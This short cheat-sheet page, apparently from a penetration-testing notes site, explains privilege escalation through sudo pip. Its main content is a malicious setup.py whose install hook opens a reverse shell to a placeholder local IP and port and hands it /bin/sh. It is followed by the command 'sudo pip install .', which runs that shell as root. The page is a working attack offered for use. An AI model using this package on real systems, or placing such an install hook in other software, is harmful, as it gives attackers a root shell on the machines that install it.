---
title: "Pip"
date: 2025-7-25
tags: ["Exploitation", "Pip", "Pip3", "Python", "Sudo"]
---

### Privesc #1: Create a Malicious Package

#### 1. Create a setup.py

```console
#!/usr/bin/env python3

from setuptools.command.install import install
from setuptools import setup
import os
import socket
import subprocess

class Exploit(install):
    def run(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("<LOCAL_IP>",<LOCAL_PORT>)) # CHANGE HERE
        os.dup2(s.fileno(),0)
        os.dup2(s.fileno(),1)
        os.dup2(s.fileno(),2)
        p = subprocess.call(["/bin/sh", "-i"])

setup(
    cmdclass={
        "install": Exploit
    }
)
```

#### 2. Exploit

```console
# Run
sudo pip install .
```
